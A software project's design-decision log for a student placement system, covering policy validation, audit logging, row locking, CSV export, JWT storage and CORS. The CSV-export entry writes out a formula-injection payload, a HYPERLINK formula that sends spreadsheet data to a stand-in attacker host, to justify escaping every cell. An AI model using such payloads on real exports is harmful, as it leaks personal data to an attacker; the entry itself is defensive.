## 44. Per-type policy settings: required, or rejected if they don't apply
**Milestone:** 6 · **Date:** 2026-11-02

**Decision:** `PUT /api/policies/{type}` with `{active, ctcThresholdLpa, maxOffers}` replaces that policy's settings (TPO_ADMIN only).
- **Bean Validation:** `active` is required. A threshold must be > 0, with at most 2 decimals and at most 4 digits before the point (`NUMERIC(6,2)`). `maxOffers` must be 1–20 (the cap keeps it well inside `SMALLINT`).
- **Per-type checks in `PolicyService`** (new `BadRequestException` → 400):
  - `DREAM_OFFER` requires `ctcThresholdLpa`.
  - `MAX_OFFERS` requires `maxOffers`.
  - A setting that **doesn't apply** to the type (e.g. `maxOffers` on `ONE_OFFER`) is rejected: "maxOffers does not apply to ONE_OFFER; leave it out".
- An unknown type in the URL is a 400 (the existing type-mismatch handler).
- `updated_by` comes from the JWT user (`CurrentUserProvider` + `getReferenceById`). The service sets `updated_at` from the injected `Clock` on every save, so even a no-change PUT records who saved last.
- Rows are only updated, never created or deleted: there's exactly one per type, seeded in V2.

**Alternatives:**
- Silently ignore fields that don't apply.
- A custom class-level validation annotation.

**Why:** If an admin sends `maxOffers` for ONE_OFFER and it's silently dropped, they'll believe a limit exists when it doesn't. A 400 shows the mistake immediately. A switch in the service is simpler to read and test than a custom validator. The DB `CHECK`s (decision 6) remain the backstop.

**Done in Milestone 7 Session B:** every real policy change is audited (`POLICY / POLICY_CHANGED`, old → new settings); a PUT that changes nothing writes no row. See decisions 53 and 54.

## 45. Known limitation (resolved in Milestone 7): policies were checked only at apply time
**Milestone:** 6 · **Date:** 2026-11-02

**Limitation:** policies are enforced when a student **applies**, but offers are created **later**, when an admin marks an application `SELECTED` (Milestone 7). A student with 0 offers can apply to several FULL_TIME drives, every apply allowed, and then get selected by two of them. They end up holding more offers than ONE_OFFER, DREAM_OFFER or MAX_OFFERS allows. The apply-time check can't prevent this, because at apply time no offer exists yet.

**Why we accept it for now:** there's no API to mark `SELECTED` until Milestone 7, so the gap can't happen through the app yet. The fix belongs where offers are created.

**Resolved in Milestone 7 (Session A):**
1. Selection re-checks the policies with the student's current offers; a block is a 409 with the reason, and there is no admin override (decision 49).
2. After each new FULL_TIME offer, the student's other pending FULL_TIME applications that a policy now forbids become `INELIGIBLE` with the policy reason (decision 49).
3. Both changes are audited (decision 46), and the student row is locked so two selections for one student can't both pass (decision 50).

## 46. Audit log: written in the same transaction, through one `StatusChanges` helper
**Milestone:** 7 · **Date:** 2026-11-02

**Decision:**
- `AuditService.record(...)` saves an `audit_logs` row with `@Transactional(propagation = MANDATORY)`, so it **joins the caller's transaction**. Called outside a transaction, it fails.
- Every application status change goes through `StatusChanges.change(application, status, reason, trigger)`. It sets the status and reason and writes the audit row. If neither the status nor the reason changed, it writes nothing. `StatusChanges.created(...)` records a new application (old value `null`).
- `actor_id` = the JWT user: the student for apply and withdraw, the admin for everything else. That includes the policy `INELIGIBLE` changes an admin's selection causes.
- `old_value` = `{status, reason}`. `new_value` = `{status, reason, trigger}`, where trigger is `APPLY | WITHDRAW | ROUND_RESULT | SELECTION | POLICY | DRIVE_COMPLETED`.
- The JSONB columns are mapped as `String` with `@JdbcTypeCode(SqlTypes.JSON)`, and the JSON is written with Spring's Jackson `JsonMapper`. Reasons with quotes stay valid JSON.
- `status_reason` is `VARCHAR(300)`, so `StatusChanges` cuts longer reasons (several policy reasons joined) to 300 characters ending in "...". A long reason can't fail the whole transaction.

**Alternatives:**
- `REQUIRES_NEW` (a separate transaction for the audit row).
- JPA entity listeners or DB triggers.
- Calling `AuditService` by hand in every service.

**Why:**
- **Same transaction:** a change and its audit row commit together or roll back together. With `REQUIRES_NEW`, a rolled-back selection would still leave an audit row saying it happened.
- **One helper:** every path (apply, withdraw, results, selection, policy, completion) uses the same method, so none can forget the audit, and "no change → no row" holds everywhere.
- **Trigger field:** when a student disputes "why am I INELIGIBLE?", the row answers it directly (`POLICY`, actor = the admin who made the selection).
- **Not listeners or triggers:** they don't know the *reason* or the *trigger*, and a DB trigger can't see the JWT user.

## 47. Rounds: numbered 1, 2, 3… without gaps; the number never changes
**Milestone:** 7 · **Date:** 2026-11-02

**Decision:**
- Admin endpoints: `POST/GET /api/drives/{driveId}/rounds` and `PUT /api/drives/{driveId}/rounds/{roundId}`. Rounds can be added or edited only while the drive is `OPEN` or `CLOSED` (otherwise 409).
- A new round's `roundNo` must be the drive's next number (max + 1). Otherwise 409 "the next round number for this drive is 3". The `UNIQUE (drive_id, round_no)` constraint catches two admins adding the same number at once (409).
- Edit changes `name` and `scheduledAt` only. `roundNo` may be left out or repeated. A different number is a 400 ("roundNo cannot be changed").
- There's no delete in v1.

**Alternatives:**
- Allow any number and treat "the previous round" as the nearest lower one.
- Allow renumbering while no results exist.

**Why:** "Round N only for applications that CLEARED round N-1" and "must clear the final round" are only clear-cut if numbers have no gaps and never move. Renumbering a round that has results would silently change which results count as "the previous round".

## 48. Bulk round results: all or nothing, upsert, status derived from all results
**Milestone:** 7 · **Date:** 2026-11-02

**Decision:**
- `PUT /api/drives/{driveId}/rounds/{roundId}/results` with `{results: [{applicationId, result, remarks}]}` (1–500 items). PUT because it's an upsert: sending the same sheet twice gives the same state.
- Only while the drive is `CLOSED` (409).
- **Every item is checked before anything is saved.** The problems are collected by `BatchValidation`, in item order:
  - **400-type:** an application listed twice; an application not in this drive.
  - **409-type:** the status is `SELECTED`, `WITHDRAWN` or `INELIGIBLE`; round N > 1 without `CLEARED` in round N-1; marking `NOT_CLEARED`/`ABSENT` while the application has a result in a **later** round.
  - Any problem → one response, `details` lists **every** problem, nothing is saved. Status 400 if any 400-type problem exists, otherwise 409.
- Then each result is upserted (the existing row is updated, or a new one inserted), and the status is **recalculated from all the application's results** by `RoundStatusCalculator`: any `NOT_CLEARED`/`ABSENT` → `REJECTED` "Not cleared in Round N: name" (the earliest such round); otherwise any `CLEARED` → `SHORTLISTED`; otherwise `APPLIED`. The change is audited (trigger `ROUND_RESULT`).
- Corrections are allowed until the drive is `COMPLETED`.

**Alternatives:**
- Save the valid items and report the bad ones (partial success, e.g. 207 Multi-Status).
- Store the status as "whatever the last result said".
- Cascade-delete later-round results when an earlier round is failed.

**Why:**
- **All or nothing:** the admin is uploading one results sheet. With partial saves they'd have to work out which rows went in and resend only the rest, which is easy to get wrong. With all-or-nothing the DB is never half-updated: fix the sheet, resend the whole thing. The upsert makes resending safe. It's also one transaction, which is simple to reason about and test.
- **Derive the status from all results:** a correction to any round gives the right status, with no "undo" logic. The calculator is pure, so it's tested without mocks.
- **Block instead of cascade:** "failed round 1 but cleared round 2" would be contradictory data, and silently deleting results is worse. The cost is a **known limitation:** without a delete-result endpoint, that particular correction can't be made in v1.

## 49. Final selection, and re-checking policies after each offer (fixes decision 45)
**Milestone:** 7 · **Date:** 2026-11-02

**Decision:** `POST /api/drives/{driveId}/selections` with `{applicationIds: [...]}` (1–200), all or nothing (as decision 48). Rules for each application:
1. The drive is `CLOSED`, and the application belongs to it and is listed once (400 otherwise).
2. Status `APPLIED` or `SHORTLISTED`. `INELIGIBLE` → 409 **with its reason**. `SELECTED` → "already SELECTED". Others → 409 naming the status.
3. **If the drive has rounds**, the application must have `CLEARED` the highest-numbered round: "Application 12 has not cleared the final round (Round 2: Technical)". Drives without rounds select directly.
4. **Policies are checked again at selection time** with the student's current offers, so a policy switched on after the student applied is respected. Blocked → 409 with the policy reason.

Then the application becomes `SELECTED` (audited, `SELECTION`). If the drive is `FULL_TIME` and a policy is active, the student's **other pending FULL_TIME applications** (`APPLIED`/`SHORTLISTED`, in any drive) are re-checked with `PolicyEngine`, using the offers **including the new one**. Each one now blocked → `INELIGIBLE` with the policy reason (audited, trigger `POLICY`). The response lists `selected` and `madeIneligible`.
- **ONE_OFFER:** all other pending applications → INELIGIBLE.
- **DREAM_OFFER (T):** first offer below T → pending applications to drives ≥ T **stay active**, the rest → INELIGIBLE. A dream offer, or the one upgrade used → all INELIGIBLE.
- **MAX_OFFERS (n):** INELIGIBLE only once the student holds n offers.
- An internship selection isn't an offer (decision 40), so it triggers no policy queries and no re-check.

**Alternatives:**
- Leave pending applications alone and only block the next selection.
- Flag them for the TPO to decide.
- An admin override for policy blocks.

**Why:**
- "May this pending application continue?" is the same question as "could the student apply to that drive now?", so the **same `PolicyEngine`** answers it, unchanged. No second set of rules to keep in sync.
- Marking them `INELIGIBLE` right away, with the reason (as for criteria changes, decision 11), means the student and the TPO both see the effect immediately. The 409 on selecting one explains why.
- The re-check uses the offers in memory (`old offers + the new one`), so it doesn't depend on when Hibernate flushes.
- **Known limitation:** there's no "un-select" in v1, so an application made INELIGIBLE by a policy is never restored automatically. No override either: a TPO who wants an exception must change the policy first.

## 50. Locking: the student row guards that student's applications; the drive row guards the drive
**Milestone:** 7 · **Date:** 2026-11-02

**Decision:**
- **Rule:** every transaction that changes a student's application status first takes `SELECT … FOR UPDATE` on that student's `student_profiles` row. That covers apply, withdraw, round results, selection, and completing a drive.
- **Lock first, then load.** Batches first read only the student ids (a plain id query), lock those rows (`ORDER BY id`), and only then load the `Application` entities. Otherwise Hibernate would keep the stale copies it loaded before the lock.
- Round results, selection and every drive status change also lock the **drive row** first. The order is always **drive, then students**.

**Alternatives:**
- No lock (the race in decision 45 stays open).
- Optimistic locking (`@Version`, needs a migration and retries).
- `SERIALIZABLE` isolation.
- A UNIQUE constraint.

**Why:**
- **The race:** admin A selects Riya in drive X while admin B selects her in drive Y. Both read "0 offers", both pass ONE_OFFER, and she ends up with two offers. A UNIQUE constraint can't stop this, because the rule spans rows in different drives. With the lock, B waits for A's commit, then reads Riya's new offer (and that the drive-Y application is now INELIGIBLE), and gets a 409.
- **Apply and withdraw lock too:** otherwise a student could apply during a selection and slip past the new offer, or a withdrawal could overwrite a fresh INELIGIBLE.
- **Updated in Session B: apply first takes a SHARED lock on the drive** (`SELECT … FOR SHARE`, `DriveRepository.findByIdForShare`), then the student lock. Without it, an apply that is in flight while an admin edits the criteria could commit afterwards against the *old* criteria and stay APPLIED, because the edit's re-check can't see an uncommitted row. Shared locks don't block each other, so students still apply in parallel; they only wait for (and block) the drive's `FOR UPDATE` lock taken by edits and status changes.
- **The drive lock** stops "complete" from racing a results upload or a selection on the same drive. Since Session B, editing a drive takes it too (then the students, decision 57).
- **No deadlocks:** every transaction takes the locks in the same order (the drive first, then students by ascending id). Apply takes the drive (shared) and then the student; withdraw takes only the student. Withdraw never waits for a drive lock, so it can't close a cycle with apply.
- The locks are held for a few milliseconds by admin actions. The only contention is between requests for the **same** student or drive, which is exactly what must be serialised.

## 51. Completing a drive rejects every application still pending
**Milestone:** 7 · **Date:** 2026-11-02

**Why:** a completed drive with "pending" applications would mislead students. Doing it as part of the transition means it can't be forgotten, and the reason tells the student what happened.

## 53. V3 migration: new audit row kinds, and `status_reason` widened to 1000 characters
**Milestone:** 7 (Session B) · **Date:** 2026-11-02

**Decision:** `V3__audit_types_and_longer_reason.sql`. V1 and V2 are never edited, because Flyway checksums applied migrations.
- The two audit CHECKs are dropped and re-added with `ROUND_RESULT`/`POLICY` (entity types) and `RESULT_CHANGED`/`POLICY_CHANGED` (actions).
- `applications.status_reason` becomes `VARCHAR(1000)`. In PostgreSQL, widening a VARCHAR is a metadata-only change, with no table rewrite.
- `StatusChanges` still cuts a reason longer than 1000 characters (ending in "...") **for the column only**. The audit row always stores the **full** reason. "Did anything change?" compares the cut value with the stored one, so sending the same long reason again writes no row.

**Alternatives:**
- `TEXT` with no cap.
- Keep 300 characters and the truncation.
- Store the reasons as a JSON array.

**Why:** 1000 fits every realistic reason (six eligibility reasons or three policy reasons, each about 100–200 characters) with room to spare. A cap is still a sensible safety net: one unexpected long string shouldn't fail a whole batch. The audit log is the record for disputes, so it must never lose text.

## 54. Result-only edits and policy changes are audited; a no-op writes nothing
**Milestone:** 7 (Session B) · **Date:** 2026-11-02

**Decision:**
- **Round results:** every new result **and** every change writes `ROUND_RESULT / RESULT_CHANGED` (entity id = the result row). The JSON is `{applicationId, roundNo, result, remarks}`, with an old value of `null` for a new result. This is on top of the `STATUS_CHANGED` row, which is written only when the status changes. Resending an identical result writes nothing.
- **Policies:** `POLICY / POLICY_CHANGED` with `{type, active, ctcThresholdLpa, maxOffers}` old → new. A PUT that changes nothing (e.g. threshold `10` when `10.00` is stored) writes no row, but `updated_by/updated_at` are still set (decision 44).

**Alternatives:**
- Audit only corrections (not new results).
- Audit every PUT, even with no change.

**Why:** Session A had a real gap. Recording "CLEARED in round 2" for an already-SHORTLISTED application left **no trace at all**, because the status didn't change. Auditing every result write closes it. "No change → no row" is the same rule as decision 46, so the log shows only real events.

## 55. Applicants list: one page query with the student JOINed, then one batched results query
**Milestone:** 7 (Session B) · **Date:** 2026-11-02

**Decision:** `GET /api/drives/{id}/applications?status=&branch=&minCgpa=` (TPO_ADMIN), paginated, default sort `student.rollNo`.
- **Filters:** null means "no filter". `minCgpa` is inclusive and must be 0–10 (otherwise 400). An unknown enum value is a 400.
- **Each row:** the application, the student's details (including the email from `users`), and `progress {totalRounds, latestRound}`. `latestRound` is the highest-numbered round the application has a result in (`null` if none).
- **Queries, fixed whatever the page size:**
  1. drive exists
  2. the applications, with `student` and `student.user` JOINed (`@EntityGraph`; both are many-to-one, so paging stays in SQL)
  3. the count
  4. the drive's round count
  5. the page's results in one `IN` query

  A repository test counts the SQL statements with Hibernate statistics: 5 for a page whether it has 1 row or many, 4 for the unpaged export.

**Alternatives:**
- A DTO constructor query that also aggregates the rounds in SQL.
- A per-row lookup of rounds.

**Why:** the batched `IN` query is the same pattern as the student browse page (decision 31): simple, and provably not N+1. "Latest round" answers the TPO's real question ("how far did this candidate get?") without listing every round per row.

## 56. CSV export: every cell escaped against formula injection, phone column included
**Milestone:** 7 (Session B) · **Date:** 2026-11-02

**Decision:** `GET /api/drives/{id}/applications/export` takes the same filters as the list, returns every row sorted by roll number, and sends `text/csv; charset=UTF-8` with `Content-Disposition: attachment; filename="drive-{id}-applicants.csv"`.
- **`CsvWriter`** (pure, in `common`):
  - A cell starting with `=`, `+`, `-`, `@`, tab or CR gets a leading `'`.
  - Then RFC 4180 quoting: a cell with a comma, quote or line break is wrapped in quotes, with inner quotes doubled.
  - CRLF line endings, and a UTF-8 BOM so Excel reads non-ASCII names correctly.
- **The phone column is escaped too:** `+919876543210` becomes `'+919876543210`.
- The endpoint has no `produces`, so a 400 or 404 still returns the standard JSON error.

**The attack:** a student sets their name to `=HYPERLINK("http://evil.site/?d="&C2,"Click")`. When the TPO opens the export in Excel, the cell runs as a formula and can send other students' data to the attacker, or start programs through old DDE formulas. The leading `'` makes Excel treat the cell as plain text.

**Why not exempt the phone column:**
1. The "digits only, optional +" rule is **Bean Validation on the API**, not a DB constraint, so rows from the seed, SQL fixes or a future import path can bypass it.
2. An exemption is one more rule every future column has to remember. "Every cell is escaped" can't be forgotten.
3. Without the `'`, Excel turns `+919876543210` into the number `9.19877E+11` and the digits are lost. Shown as text, the phone number stays readable.

**Known limitation:** the export loads all matching rows in one go, which is fine for a drive (hundreds of applicants) but not streamed.

## 57. Criteria-change re-evaluation: lock, re-check with `EligibilityService`, one-way
**Milestone:** 7 (Session B) · **Date:** 2026-11-02

**Decision:** in `DriveService.update`:
1. Lock the drive row (`FOR UPDATE`), check that the drive is editable and the jobType rule (decision 58), then snapshot the old values.
2. Apply the edit and validate it (dates, `checkCanOpen` for OPEN).
3. If nothing changed: no audit, no re-check, `applicationsMadeIneligible: 0`.
4. If the drive is **OPEN** and an **eligibility field** changed (branches, minCgpa, maxBacklogs, graduationYear), `CriteriaChangeService.reevaluate` runs:
   - read the student ids of `APPLIED`/`SHORTLISTED` applications, lock those students (`ORDER BY id`), and load the applications fresh with the student JOINed;
   - run the **unchanged** `EligibilityService` on each one;
   - each one that fails becomes `INELIGIBLE` "Drive criteria changed: \<every reason, joined with ; \>" through `StatusChanges` (trigger `CRITERIA_CHANGE`, actor = the admin).
5. The edit is audited as `DRIVE / CRITERIA_CHANGED` with **only the changed fields** old → new. The new value also has `applicationsMadeIneligible`. Values are normalised so `12` = `12.00`, and branches are a sorted list.
6. The PUT response is `DriveResponse` plus `applicationsMadeIneligible`. The field is `@JsonInclude(NON_NULL)`, so other drive responses are unchanged.

- Status and deadline need no special handling: the drive is OPEN with a future deadline (just checked), so those two eligibility rules always pass and only the criteria decide.
- Edits to non-criteria fields (title, CTC, location, deadline…) are audited but re-check nothing. A later deadline doesn't make an existing application less eligible.

**Known limitations:**
- **One-way only.** Loosening the criteria never restores an `INELIGIBLE` application. Restoring would need to know *why* each one became INELIGIBLE (criteria, policy, or an earlier edit) and would undo decisions students may have acted on. A TPO who wants to restore one must do it outside the app in v1.
- **Placement policies are not re-checked** on an edit (for example, a CTC change across the DREAM_OFFER threshold). This is safe because selection re-checks policies anyway (decision 49), so a forbidden offer still can't happen. The student only learns of the block at selection time instead of at edit time.

**Alternatives:**
- Two-way re-evaluation.
- Flag the applications for the TPO instead of changing them.
- A separate "re-evaluate" endpoint.

**Why:** the same `EligibilityService` that decides apply decides re-evaluation, so there's no second set of rules to keep in sync. Doing it inside the edit's transaction means the edit, the status changes and their audit rows commit together. The reason tells the student exactly which new rule they fail, which is the whole point of the project.

## 58. `jobType` can change only while a drive is DRAFT
**Milestone:** 7 (Session B) · **Date:** 2026-11-02

**Decision:** changing `jobType` on an OPEN drive is a **409** "jobType can be changed only while the drive is DRAFT (status: OPEN): switching between FULL_TIME and INTERNSHIP would change what counts as an offer for students who already applied". Leaving it unchanged is fine. CLOSED and COMPLETED drives can't be edited at all (decision 18).

**Alternatives:**
- Allow it and re-check policies.
- Allow it silently.

**Why:** FULL_TIME vs INTERNSHIP decides what counts as an offer and whether policies apply (decision 40). Switching it mid-process would silently change the rules for students who applied under the old ones. A one-line rule is simpler and more honest than trying to re-derive everything.

## 59. Audit view: fixed newest-first order, filters checked, JSON returned as JSON
**Milestone:** 7 (Session B) · **Date:** 2026-11-02

**Decision:** `GET /api/audit?entityType=&entityId=&from=&to=` (TPO_ADMIN), paginated.
- **Order:** always `createdAt DESC, id DESC`. Any client sort is ignored; `id` breaks ties within one transaction.
- **Date range:** `from` is inclusive and `to` exclusive, both ISO-8601 instants.
- **400s:** `entityId` without `entityType` (ids are only unique within a type); `from` not before `to`; a malformed date.
- **Response:** `oldValue`/`newValue` are real JSON objects (parsed from JSONB), not strings. `actorEmail` comes from one batched `IN` query per page, and is `null` for system rows.
- **Null filters:** the query uses `CAST(:from AS Instant) IS NULL`. For a null `Instant`, the driver sends no type, and PostgreSQL fails with "could not determine data type of parameter". The rollback DB test caught this; mocks wouldn't have.

**Alternatives:**
- JPA Specifications (dynamic WHERE).
- Default `from`/`to` sentinel dates.

**Why:** an audit log read in any order other than "newest first" is confusing, so the order isn't configurable. One JPQL query with nullable filters is easy to read, and the cast is a single documented line.

## 60. Stats: aggregate SQL, offers = FULL_TIME selections, CTC over each student's best offer
**Milestone:** 7 (Session B) · **Date:** 2026-11-02

**Decision:** `GET /api/stats` (TPO_ADMIN).

**Definitions:**
- **Offer:** `SELECTED` in a `FULL_TIME` drive (decision 40). It's written once as a SQL fragment that every query reuses.
- **Placed:** a student with at least one offer.
- **CTC (highest, average, median):** over each placed student's **best** offer, so a student with two offers counts once.
- **Total students:** every student profile (all batches).

**Queries:** 4 native aggregate queries through Spring's `JdbcClient` (spring-jdbc, already a dependency of Spring Data JPA):
- students and placed students per branch (`COUNT … FILTER (WHERE EXISTS …)`)
- offers per company
- `MAX`/`AVG`/`percentile_cont(0.5)` over the best offers
- drives per status

**Java's part:** it only sums the few branch rows, divides counts into percentages (2 decimals, HALF_UP, 0.00 when there are no students), and fills in drive statuses that have 0 drives. The service is `@Transactional(readOnly = true)`, so the 4 queries share one connection and transaction.

**Alternatives:**
- Count over every offer.
- JPQL (has no median).
- Load the entities and compute in Java.

**Why:** "average package" in Indian placement reports means per placed student. Counting a double-offer student twice would inflate it. The database is built to aggregate: the response size is the same whether there are 50 students or 50,000, and nothing is loaded into memory row by row.

**Known limitation:** all batches are mixed together. A `graduationYear` filter would be a small v2 addition.

## 62. The JWT is stored in `localStorage` (the XSS trade-off)
**Milestone:** 8 · **Date:** 2026-11-02

**Decision:** after login the frontend keeps the access token in `localStorage` (`placementhub.token`). Every request reads it there (the axios request interceptor) and sends it as `Authorization: Bearer <token>`. Logout, a 401, and an expired or unreadable token on page load all remove it.

**Alternatives:**
- **An `HttpOnly` cookie set by the backend:** JavaScript can't read it, so an XSS bug can't steal it. But the browser then sends it automatically, so we'd need CSRF protection (SecurityConfig disables CSRF because there are no cookies, see #32), `SameSite` settings, and cross-site cookie setup between Vercel and Render. That's a backend change outside v1's scope.
- **Memory only (a React state variable):** an XSS bug can't read storage it doesn't have, but every page refresh logs the user out. Without refresh tokens (v2) that's bad UX.
- **`sessionStorage`:** the same XSS exposure as `localStorage`; it only adds "logged out when the tab closes".

**Why:** the simplest option that survives a refresh and needs no backend change. The risk is **XSS**: any script that runs on our page can read `localStorage` and send the token somewhere else. It's limited because:
- React escapes everything it renders (we never use `dangerouslySetInnerHTML`).
- There are no third-party scripts.
- The token lives for only 2 hours.
- The backend still checks the role and ownership on every request.

**Known limitation / v2:** an `HttpOnly` + `Secure` + `SameSite` cookie with refresh tokens, and a Content-Security-Policy header when deploying (M12).

## 63. The frontend reads id, email and role from the JWT payload, not from a new endpoint
**Milestone:** 8 · **Date:** 2026-11-02

**Decision:** the login response is still `{accessToken, tokenType, expiresIn, role}`. The frontend decodes the token's payload with a small helper (`auth/jwt.js`: base64url → base64 → bytes → UTF-8 → JSON, no npm package). It reads `sub` (user id), `email`, `role` and `exp`. On page load a token that is already expired, or that can't be read, counts as logged out.

**Alternatives:**
- Add `id`/`email` to `LoginResponse` (a backend change for data the token already has; it also wouldn't help after a refresh, when only the token is left).
- Call a `/api/auth/me` endpoint on every page load (an extra request and a new endpoint).
- A JWT library such as `jwt-decode` (an extra dependency for 10 lines of code).

**Why:** the token is the one thing that survives a refresh, and it already holds what the UI needs. Decoding **doesn't verify** the signature, and it doesn't have to: the frontend uses the claims only to decide what to *show*. Someone who edits their token's role in `localStorage` sees the admin pages' frame, and every admin API call then fails with 401 (the signature no longer matches).

## 64. Dev uses a Vite proxy; deployed origins come from `CORS_ALLOWED_ORIGINS`
**Milestone:** 8 · **Date:** 2026-11-02

**Decision:**
- **Dev:** `vite.config.js` proxies `/api` to `http://localhost:8080`. The browser only talks to `localhost:5173`, so every call is same-origin and CORS never applies.
- **Deployed (M12):** the frontend's `VITE_API_BASE_URL` points at the backend, and the backend allows the frontend's origin through `CorsConfig` (`app.cors.allowed-origins` = `CORS_ALLOWED_ORIGINS`, comma-separated, default `http://localhost:5173`). Only `/api/**`, the methods we use, and the `Authorization`/`Content-Type` headers are allowed. `Content-Disposition` is exposed for the CSV file name, and there are no credentials because we use no cookies.
- `SecurityConfig` calls `.cors()`, so CORS runs **before** authentication: a browser's preflight `OPTIONS` (which never carries a token) gets its CORS answer instead of a 401.

**Alternatives:**
- `@CrossOrigin` on each controller (easy to forget one, and it runs after security, so preflights would get a 401).
- `allowedOrigins("*")` (any website could call our API from a victim's browser with a stolen token; also not allowed together with credentials if we ever move to cookies).
- CORS in dev instead of a proxy (works, but every local run then depends on the backend's CORS settings, and the dev setup would differ from a same-origin deployment).

**Why:** the same-origin setup in dev is the least moving parts. The env var lets M12 set the real Vercel/Netlify URL without a code change. Tests check that an allowed preflight gets the headers without a token and an unknown origin gets a 403.

## 65. One global 401 handler: clear the token, full reload to `/login`
**Milestone:** 8 · **Date:** 2026-11-02

**Decision:** an axios response interceptor handles every 401 **for a request that carried a token** (except `/api/auth/*`). It removes the token, saves "Session expired, please log in again." in `sessionStorage`, and does `window.location.assign('/login')`. The login page shows that message once, then deletes it.

A 401 from `/api/auth/login` means a wrong email or password, so the login page shows it like any other error. A 401 on a request without a token can't be an expired session.

**Alternatives:**
- Handle 401 in every page (repeated code, easy to forget).
- Navigate with React Router from the interceptor (it lives outside React, so it would need a navigate function passed in from a component).
- Check `exp` before every request (the backend is the source of truth anyway, and clocks can differ).

**Why:** one place, a few lines, and the full reload throws away all in-memory state, so no page can keep showing another user's data.

**Related (403):** a wrong-role URL is handled by `ProtectedRoute` before any request (redirect to the user's own home). A 403 from the API is shown as a normal error.

**Known limitation:** logging out in one tab doesn't log out other open tabs until their next API call returns 401 (or they reload). A `storage` event listener could fix that in v2.

## 67. Student drive detail: visible if OPEN, or if the student applied to it
**Milestone:** 9 · **Date:** 2026-11-02

**Decision:** `GET /api/students/me/drives/{id}` returns the same shape as one browse item (`drive`, `eligible`, `reasons`, `applicationStatus`), built by the same code as browse. The drive is returned if it is OPEN, **or** if the student has an application to it in any status. - Any drive except DRAFT (shows students drives they never had anything to do with).

**Why:** a student needs the drive behind each of their applications, even after it closes, and nothing else. One 404 for "missing" and "not yours to see" doesn't reveal which ids exist (the same idea as the application 404 in decision #29). Drives never go back to DRAFT and apply needs OPEN, so a DRAFT drive can't have an application.

## 68. A "200 that isn't our JSON" is an error (the blank-page bug)
**Milestone:** 9 · **Date:** 2026-11-02

**Decision:** `useApi` treats a response whose body isn't a JSON object or array as an error ("Unexpected answer from the server… restart npm run dev so the /api proxy is active"). `toApiError` gives the same message for a 404 that has no error JSON. Pages show their fields only once data has loaded; a failed load shows the error with "Try again", never empty values.

**Real cause of the bug:** during a branch switch the Vite dev server lost its `/api` proxy, so Vite answered the request itself (a 404, not the backend). The old home page didn't handle that case, and the student saw an empty page instead of an error.

**Alternatives:**
- Check `Content-Type` in the global axios interceptor (would also hit the CSV download and 204 responses that admin pages will need).
- Fix only the home page (the same thing would happen on every new page).

**Why:** one check, in the one hook every page uses to load data, covers both ways the dev server can answer instead of the backend: its own 404, or its `index.html` with 200.
